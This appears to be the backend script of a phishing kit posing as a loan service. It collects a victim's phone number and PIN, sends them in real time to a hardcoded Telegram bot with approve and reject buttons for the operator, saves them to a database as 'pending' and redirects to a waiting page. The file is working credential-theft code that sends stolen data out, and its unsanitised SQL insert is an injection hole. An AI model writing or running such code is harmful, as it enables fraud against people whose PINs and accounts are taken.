<?php

$conn = new mysqli("localhost","root","","loan-db");

// get data
$phone = $_POST['phone'];
$pin = $_POST['pin'];


// TELEGRAM
$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";
$chat_id = "6057287429";

$message = "NEW USER\n";
$message .= "Phone: ".$phone."\n";
$message .= "Code: ".$pin;

// Inline keyboard buttons
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => 'Approve ✅', 'callback_data' => 'approve_pin'],
            ['text' => 'Reject ❌', 'callback_data' => 'reject_pin']
        ]
    ]
];

$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'reply_markup' => json_encode($keyboard)
];

// Send to Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);// save with status pending
$sql = "INSERT INTO user_details (phone, pin, status)
VALUES ('$phone','$pin','pending')";

$conn->query($sql);

// get ID
$id = $conn->insert_id;

// go to waiting page
header("Location: waiting.php?id=$id");
exit();

?>